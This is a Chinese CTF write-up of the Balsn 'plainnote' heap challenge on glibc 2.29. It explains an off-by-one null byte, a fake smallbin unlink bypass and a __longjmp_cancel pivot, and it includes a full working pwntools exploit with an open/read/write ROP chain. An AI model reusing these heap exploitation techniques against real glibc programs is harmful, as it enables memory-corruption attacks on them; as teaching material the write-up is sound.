# plainnote

题目环境是`ubuntu19.04,libc2.29`

这题也是学到了很多新的知识

题目保护全开，且

```c
ruan@ruan:/mnt/hgfs/shared/balsnctf/pwn/plainnote/release/docker/share$ seccomp-tools dump ./note
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL

```
可以看出，最后因该是要`orw`来获得`flag`

题目是菜单题，然后漏洞点也很明显，就是`add`时的`off_by_one`

```c
char *add()
{
  char *result; // rax
  char *v1; // rbx
  unsigned int i; // [rsp+8h] [rbp-18h]
  unsigned int size; // [rsp+Ch] [rbp-14h]

  for ( i = 0; i <= 0xFF && note[i]; ++i )
    ;
  myprintf("Size: ");
  size = read_int();
  note[i] = malloc(size);
  myprintf("Content: ");
  result = (char *)note[i];
  if ( result )
  {
    v1 = (char *)note[i];
    result = &v1[read(0, note[i], size)];	//off_by_one
    *result = 0;
  }
  return result;
}
```

但这题的`libc`是`2.29`的，在`libc2.29`中加入了新的`check`，让`off_by_one`的利用更加困难

```c
/* consolidate backward */
if (!prev_inuse(p)) {
  prevsize = prev_size (p);
  size += prevsize;
  p = chunk_at_offset(p, -((long) prevsize));
  if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr ("corrupted size vs. prev_size while consolidating");
  unlink_chunk (av, p);
}
```
`chunk`在合并时会检测`prev_size`和要合并的`chunk`的`size`是否相同，不相同就报错退出

然后是对`tcache`的检测

```c
/* This test succeeds on double free.  However, we don't 100%
    trust it (it also matches random payload data at a 1 in
    2^<size_t> chance), so verify it's not an unlikely
    coincidence before aborting.  */
if (__glibc_unlikely (e->key == tcache))
  {
    tcache_entry *tmp;
    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
    for (tmp = tcache->entries[tc_idx];
    tmp;
    tmp = tmp->next)
      if (tmp == e)
  malloc_printerr ("free(): double free detected in tcache 2");
    /* If we get here, it was a coincidence.  We've wasted a
        few cycles, but don't abort.  */
  }
```
这里对`tcache`链表上的所有`chunk`进行对比，检测是否有重复，这样遏制了`double free`，但是鉴于`tcache`还是没有对`size`的检测，还是比较容易利用

然后这题的难点是`off_by_one`在`libc2.29`下的利用（是真的难

看了大佬的`wp`，大佬的思路真的太神奇了,orz

大佬利用的是`smallbin chunk`合并时，地址高的那个`chunk`的`fd`和`bk`不会被覆写，这样就有了一个假的`fd`和`bk`，而且`chunk`的地址也是以`0x?00`结尾，太精妙了

合并前

```c
smallbins
0x20 [corrupted]
FD: 0x562a65a76a70 —▸ 0x562a65a76bf0 —▸ 0x562a65a76d70 —▸ 0x562a65a76ef0 —▸ 0x562a65a77110 ◂— ...
BK: 0x562a65a76990 —▸ 0x562a65a76b10 —▸ 0x562a65a76c90 —▸ 0x562a65a76e10 —▸ 0x562a65a76f90 ◂— ...
0x30: 0x562a65a77720 —▸ 0x562a65a77600 —▸ 0x562a65a77690 —▸ 0x7f75ba848cc0 (main_arena+128) ◂— 0x562a65a77720


```

合并后

```c
mallbins
0x20 [corrupted]
FD: 0x562a65a76a70 —▸ 0x562a65a76bf0 —▸ 0x562a65a76d70 —▸ 0x562a65a76ef0 —▸ 0x562a65a77110 ◂— ...
BK: 0x562a65a76990 —▸ 0x562a65a76b10 —▸ 0x562a65a76c90 —▸ 0x562a65a76e10 —▸ 0x562a65a76f90 ◂— ...
0x30: 0x562a65a77720 —▸ 0x562a65a77690 —▸ 0x7f75ba848cc0 (main_arena+128) ◂— 0x562a65a77720
0x60: 0x562a65a775d0 —▸ 0x7f75ba848cf0 (main_arena+176) ◂— 0x562a65a775d0
largebins
empty
pwndbg> telescope 0x562a65a775d0 30
00:0000│   0x562a65a775d0 ◂— 0x0
01:0008│   0x562a65a775d8 ◂— 0x61 /* 'a' */
02:0010│   0x562a65a775e0 —▸ 0x7f75ba848cf0 (main_arena+176) —▸ 0x7f75ba848ce0 (main_arena+160) —▸ 0x7f75ba848cd0 (main_arena+144) —▸ 0x562a65a77720 ◂— ...
... ↓
04:0020│   0x562a65a775f0 ◂— 0x0
... ↓
07:0038│   0x562a65a77608 ◂— 0x31 /* '1' */
08:0040│   0x562a65a77610 —▸ 0x562a65a77690 ◂— 0x0	<---A
09:0048│   0x562a65a77618 —▸ 0x562a65a77720 ◂— 0x0	<---B
0a:0050│   0x562a65a77620 ◂— 0x0

```

这一步是真的精妙，后面就是把`chunkA`和`chunkB`申请出来，伪造好他们的`bk`和`fd`，这时候地址`0x?00`就有作用了，orz

然后就

```c
pwndbg> telescope 0x55740b624700 30  <---B
00:0000│   0x55740b624700 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
... ↓
06:0030│   0x55740b624730 —▸ 0x55740b624600 ◂— 0x4444444444444444 ('DDDDDDDD')
07:0038│   0x55740b624738 —▸ 0x7fb8aa688cc0 (main_arena+128) —▸ 0x55740b623a70 ◂— 0x0
08:0040│   0x55740b624740 ◂— 0x0
... ↓

... ↓
pwndbg> telescope 0x55740b624600	<---P
00:0000│   0x55740b624600 ◂— 0x4444444444444444 ('DDDDDDDD')
01:0008│   0x55740b624608 ◂— 0x691
02:0010│   0x55740b624610 —▸ 0x55740b624690 ◂— 0x0
03:0018│   0x55740b624618 —▸ 0x55740b624720 ◂— 'AAAAAAAAAAAAAAAA'
04:0020│   0x55740b624620 ◂— 0x0

pwndbg> telescope 0x55740b624690 10	<---A
00:0000│   0x55740b624690 ◂— 0x0
01:0008│   0x55740b624698 ◂— 0x31 /* '1' */
02:0010│   0x55740b6246a0 ◂— 'DDDDDDDD'
03:0018│   0x55740b6246a8 —▸ 0x55740b624600 ◂— 0x4444444444444444 ('DDDDDDDD')
04:0020│   0x55740b6246b0 ◂— 0x0
```
可以看到`P->FD->BK`即`A->BK`为`P`,然后`P->BK->FD`即`B->FD`为`P`，可以绕过检查了,orz

`overlap chunk`后就~~简单~~了，现在问题又来了，怎么控制流程，因为程序只能`orw`，所以很容易想到`__free_hook`加`setcontext`啊，然而这并不行

`libc2.29`下`setcontext`变成了以`rdx`为基址（姑且叫基址吧

```c
pwndbg> x/20i setcontext 
   0x7fb8aa4f9e00 <setcontext>:	push   rdi
   0x7fb8aa4f9e01 <setcontext+1>:	lea    rsi,[rdi+0x128]
   0x7fb8aa4f9e08 <setcontext+8>:	xor    edx,edx
   0x7fb8aa4f9e0a <setcontext+10>:	mov    edi,0x2
   0x7fb8aa4f9e0f <setcontext+15>:	mov    r10d,0x8
   0x7fb8aa4f9e15 <setcontext+21>:	mov    eax,0xe
   0x7fb8aa4f9e1a <setcontext+26>:	syscall 
   0x7fb8aa4f9e1c <setcontext+28>:	pop    rdx
   0x7fb8aa4f9e1d <setcontext+29>:	cmp    rax,0xfffffffffffff001
   0x7fb8aa4f9e23 <setcontext+35>:	jae    0x7fb8aa4f9e80 <setcontext+128>
   0x7fb8aa4f9e25 <setcontext+37>:	mov    rcx,QWORD PTR [rdx+0xe0]
   0x7fb8aa4f9e2c <setcontext+44>:	fldenv [rcx]
   0x7fb8aa4f9e2e <setcontext+46>:	ldmxcsr DWORD PTR [rdx+0x1c0]
   0x7fb8aa4f9e35 <setcontext+53>:	mov    rsp,QWORD PTR [rdx+0xa0]
   0x7fb8aa4f9e3c <setcontext+60>:	mov    rbx,QWORD PTR [rdx+0x80]
   0x7fb8aa4f9e43 <setcontext+67>:	mov    rbp,QWORD PTR [rdx+0x78]
   0x7fb8aa4f9e47 <setcontext+71>:	mov    r12,QWORD PTR [rdx+0x48]
   0x7fb8aa4f9e4b <setcontext+75>:	mov    r13,QWORD PTR [rdx+0x50]
   0x7fb8aa4f9e4f <setcontext+79>:	mov    r14,QWORD PTR [rdx+0x58]
   0x7fb8aa4f9e53 <setcontext+83>:	mov    r15,QWORD PTR [rdx+0x60]

```
而`free`时候，`rdi`才是指向我们`free`的`chunk`，`rdx`不知道指向啥，但肯定不是可控的，那跳到`setcontext`的一开始呢，不是有`push rdi,....,pop rdx`吗，也不行，后面有`syscall`，还是会被`seccomp`杀死，这里大佬的博客又给了另一种方法,orz

```c
pwndbg> x/20i 0x7f852fe3c000+0x43cc0
   0x7f852fe7fcc0 <__longjmp_cancel>:	mov    r8,QWORD PTR [rdi+0x30]
   0x7f852fe7fcc4 <__longjmp_cancel+4>:	mov    r9,QWORD PTR [rdi+0x8]
   0x7f852fe7fcc8 <__longjmp_cancel+8>:	mov    rdx,QWORD PTR [rdi+0x38]
   0x7f852fe7fccc <__longjmp_cancel+12>:	ror    r8,0x11
   0x7f852fe7fcd0 <__longjmp_cancel+16>:	xor    r8,QWORD PTR fs:0x30
   0x7f852fe7fcd9 <__longjmp_cancel+25>:	ror    r9,0x11
   0x7f852fe7fcdd <__longjmp_cancel+29>:	xor    r9,QWORD PTR fs:0x30
   0x7f852fe7fce6 <__longjmp_cancel+38>:	ror    rdx,0x11
   0x7f852fe7fcea <__longjmp_cancel+42>:	xor    rdx,QWORD PTR fs:0x30
   0x7f852fe7fcf3 <__longjmp_cancel+51>:	nop
   0x7f852fe7fcf4 <__longjmp_cancel+52>:	mov    rbx,QWORD PTR [rdi]
   0x7f852fe7fcf7 <__longjmp_cancel+55>:	mov    r12,QWORD PTR [rdi+0x10]
   0x7f852fe7fcfb <__longjmp_cancel+59>:	mov    r13,QWORD PTR [rdi+0x18]
   0x7f852fe7fcff <__longjmp_cancel+63>:	mov    r14,QWORD PTR [rdi+0x20]
   0x7f852fe7fd03 <__longjmp_cancel+67>:	mov    r15,QWORD PTR [rdi+0x28]
   0x7f852fe7fd07 <__longjmp_cancel+71>:	mov    eax,esi
   0x7f852fe7fd09 <__longjmp_cancel+73>:	mov    rsp,r8
   0x7f852fe7fd0c <__longjmp_cancel+76>:	mov    rbp,r9
   0x7f852fe7fd0f <__longjmp_cancel+79>:	nop
   0x7f852fe7fd10 <__longjmp_cancel+80>:	jmp    rdx

```

用的是`longjmp`,orz

可以看到`rsp,rdx`都是`[rdi+offset]`来的，我们可以控制整个流程了

只不过这里还要控制一下`fs:0x30`处的值，但是前面都有`overlap chunk`了，还是很简单的，改成零就好，然后是怎么找到这个值呢，我是靠搜索`canary`找的，我们知道`canary`是`fs:0x28`,所以找到`canary`的位置，也就找到了它

```c
pwndbg> search -t qword 0x47189b55977b6700
                0x7f852fe39768 0x47189b55977b6700
[stack]         0x7ffc43f97058 0x47189b55977b6700
[stack]         0x7ffc43f97138 0x47189b55977b6700
[stack]         0x7ffc43f97188 0x47189b55977b6700
[stack]         0x7ffc43f971b8 0x47189b55977b6700
[stack]         0x7ffc43f971c8 0x47189b55977b6700
[stack]         0x7ffc43f97b98 0x47189b55977b6700
[stack]         0x7ffc43f97ba8 0x47189b55977b6700
[stack]         0x7ffc43f97c08 0x47189b55977b6700
pwndbg> 
```
`fs` 寄存器实际指向的是当前栈的 `TLS` 结构，这个结构和`libc`的偏移是固定的，在`libc`的上方

那这一切都准备好了，就能`rop`来进行`orw`了，最终读取出`flag`,再次膜拜大佬，orz

```shell
[*] Switching to interactive mode
[DEBUG] Received 0x100 bytes:
    00000000  42 61 6c 73  6e 7b 58 58  58 58 58 58  58 58 58 58  │Bals│n{XX│XXXX│XXXX│
    00000010  58 58 58 58  58 7d 0a 00  00 00 00 00  00 00 00 00  │XXXX│X}··│····│····│
    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000100
Balsn{XXXXXXXXXXXXXXX}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$ 

```
最终脚本为：（python3下的

```python
from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def rol(value,offset):
	return ((value << offset)&0xffffffffffffffff) | ((value >> (64-offset))&0xffffffffffffffff)
def cmd(command):
	p.recvuntil("Choice: ")
	p.sendline(str(command))
def add(sz,content):
	cmd(1)
	p.recvuntil("Size: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)
def show(idx):
	cmd(3)
	p.recvuntil("Idx: ")
	p.sendline(str(idx))
def dele(idx):
	cmd(2)
	p.recvuntil("Idx: ")
	p.sendline(str(idx))
def main(host,port=54321):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./note")
		# p = process("./note_29",env={"LD_PRELOAD":"./libc.so.6"})
		gdb.attach(p)
		# debug(0x0000000000000AED)
	# clear heap
	add(0x420,"A")
	dele(0)
	add(0x170,"A")
	dele(0)
	add(0x150,"A")
	dele(0)
	
	for i in range(5):
		add(0x40,"A")
	for i in range(5):
		dele(i)
	add(0x20,"A") #  0
	add(0x20,"A") #  1
	add(0x20,"A") #  2
	
	# tcache 7
	for i in range(0x7):
		add(0x20,"A") # 3 ~ 9
	
	add(0x250,"10") # 10
	dele(10)
	
	add(0x20,"10") # 10
	add(0x20,"11") # 11  Ready for fake successful unlink bin ~
	add(0x20,"12") # 12
	
	add(0x20,"13") # 13
	add(0x20,"14") # 14
	add(0x20,"15") # 15
	
	add(0x20,"16") # 16
	add(0x20,"17") # 17
	add(0x20,"18") # 18
	for i in range(7):
		dele(i+3)
	dele(17)
	dele(11)
	dele(14)
	add(0x500,"A") # 3 trigger malloc_consolidate  idx17 11 14 now in smallbins
	dele(3)
	dele(10)
	add(0x500,"A") # 3 trigger malloc_consolidate
	dele(3)
	dele(16)
	add(0x500,"A") # 3 trigger malloc_consolidate

	dele(3)
	add(0x50,"A") # 3 
	add(0x50,b"D"*0x28 + p64(0x691)[:-1]) # 4  fake size 0x690
	add(0x50,"A"*0x30) # 5 fake bk->fd
	dele(12)
	add(0x500,"A") # 6 trigger malloc_consolidate
	dele(6)
	
	# clear 0x30 tcache
	add(0x20,"A") # 6 
	add(0x20,"A") # 7
	add(0x20,"A") # 8 
	add(0x20,"A") # 9
	add(0x20,"A") # 10
	add(0x20,"A") # 11
	add(0x20,"A") # 12

	add(0x20,"D"*8) # 14 fake fd->bk
	
	for i in range(7):
		dele(i+6)
	add(0x20,"D")  #6
	add(0x500,"C"*8) # 7
	add(0x4f0,"C"*8) # 8
	dele(7)
	
	add(0x80,"1") # 7
	add(0x90,"2") # 9
	add(0x2d8,"3") # 10
	add(0xf8,b"A"*0xf0 + p64(0x690)) # 11  fake prev size & null byte overflow
	#!!!! awesome
	dele(8)
	
	show(14)
	p.recvuntil("D"*8)
	heap = u64(p.recvuntil('\n',drop=True).ljust(8,b"\x00")) - 0x2720
	info("heap : " + hex(heap))
	add(0xb0,"R")
	add(0x1000,"R")
	add(0x1000,"R")
	dele(15)
	show(12)
	libc.address = u64(p.recv(6)+b'\x00\x00') - 0x1e4ca0
	info("libc : " + hex(libc.address))
	for i in range(6):
		add(0x20,"A")
	dele(18)
	dele(9)
	payload = b"A"*0x80+p64(0)+p64(0x31)+p64(libc.symbols["__free_hook"])+b'\x00'*8
	payload += b"\x00"*0xa0+p64(0)+p64(0xa1)+p64(libc.address-0x28c0+0x30)
	add(0x200,payload)
	add(0x20,"A")
	add(0x20,p64(libc.address+0x43cc0))
	add(0x90,"A")
	add(0x90,p64(0))
	p_rax = 0x0000000000047cf8 + libc.address
	p_rdi = 0x0000000000026542 + libc.address
	p_rdx_rsi = 0x000000000012bdc9 + libc.address
	syscall_ret = 0x00000000000cf6c5 + libc.address
	heap += 0x46f0
	payload = b"\x00"*8+p64(rol(heap+0xa00,0x11)) #rbp
	payload = payload.ljust(0x30,b"\x00")
	payload += p64(rol(heap+0x300,0x11)) #rsp
	payload += p64(rol(p_rax,0x11)) #rdx
	payload = payload.ljust(0x300,b"\x00")
	payload += flat([2,p_rdi,heap+0x400,p_rdx_rsi,0,0,syscall_ret,p_rdi])
	payload += flat([3,p_rdx_rsi,0x100,heap+0x420,p_rax,0,syscall_ret,p_rdi])
	payload += flat([1,p_rdx_rsi,0x100,heap+0x420,p_rax,1,syscall_ret])
	payload = payload.ljust(0x400,b"\x00")
	payload += b"/home/note/flag\x00"
	add(0x1000,payload)		#heap + 0x46f0
	# 0x0000000000047cf8: pop rax; ret;
	# 0x000000000012bdc9: pop rdx; pop rsi; ret;
	# 0x0000000000026542: pop rdi; ret; 
	# 0x00000000000cf6c5: syscall; ret; 
	# 0x7f7596eb7cc0 <__longjmp_cancel>:	mov    r8,QWORD PTR [rdi+0x30]
    # 0x7f7596eb7cc4 <__longjmp_cancel+4>:	mov    r9,QWORD PTR [rdi+0x8]
    # 0x7f7596eb7cc8 <__longjmp_cancel+8>:	mov    rdx,QWORD PTR [rdi+0x38]
    # 0x7f7596eb7ccc <__longjmp_cancel+12>:	ror    r8,0x11
    # 0x7f7596eb7cd0 <__longjmp_cancel+16>:	xor    r8,QWORD PTR fs:0x30
    # 0x7f7596eb7cd9 <__longjmp_cancel+25>:	ror    r9,0x11
    # 0x7f7596eb7cdd <__longjmp_cancel+29>:	xor    r9,QWORD PTR fs:0x30
    # 0x7f7596eb7ce6 <__longjmp_cancel+38>:	ror    rdx,0x11
    # 0x7f7596eb7cea <__longjmp_cancel+42>:	xor    rdx,QWORD PTR fs:0x30
    # 0x7f7596eb7cf3 <__longjmp_cancel+51>:	nop
    # 0x7f7596eb7cf4 <__longjmp_cancel+52>:	mov    rbx,QWORD PTR [rdi]
    # 0x7f7596eb7cf7 <__longjmp_cancel+55>:	mov    r12,QWORD PTR [rdi+0x10]
    # 0x7f7596eb7cfb <__longjmp_cancel+59>:	mov    r13,QWORD PTR [rdi+0x18]
    # 0x7f7596eb7cff <__longjmp_cancel+63>:	mov    r14,QWORD PTR [rdi+0x20]
    # 0x7f7596eb7d03 <__longjmp_cancel+67>:	mov    r15,QWORD PTR [rdi+0x28]
    # 0x7f7596eb7d07 <__longjmp_cancel+71>:	mov    eax,esi
    # 0x7f7596eb7d09 <__longjmp_cancel+73>:	mov    rsp,r8
    # 0x7f7596eb7d0c <__longjmp_cancel+76>:	mov    rbp,r9
    # 0x7f7596eb7d0f <__longjmp_cancel+79>:	nop
    # 0x7f7596eb7d10 <__longjmp_cancel+80>:	jmp    rdx

	dele(26)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so.6",checksec=False)
	main(args['REMOTE'])
```

引用下大佬的话： `All about Heap Feng Shui`

参考链接：

[https://gist.github.com/st424204/6b5c007cfa2b62ed3fd2ef30f6533e94?fbclid=IwAR3n0h1WeL21MY6cQ_C51wbXimdts53G3FklVIHw2iQSgtgGo0kR3Lt-1Ek](https://gist.github.com/st424204/6b5c007cfa2b62ed3fd2ef30f6533e94?fbclid=IwAR3n0h1WeL21MY6cQ_C51wbXimdts53G3FklVIHw2iQSgtgGo0kR3Lt-1Ek)

[https://www.xmcve.com/2019/08/glibc-2-29-%e6%96%b0%e5%a2%9e%e7%9a%84%e9%98%b2%e6%8a%a4%e6%9c%ba%e5%88%b6-ex/](https://www.xmcve.com/2019/08/glibc-2-29-%e6%96%b0%e5%a2%9e%e7%9a%84%e9%98%b2%e6%8a%a4%e6%9c%ba%e5%88%b6-ex/)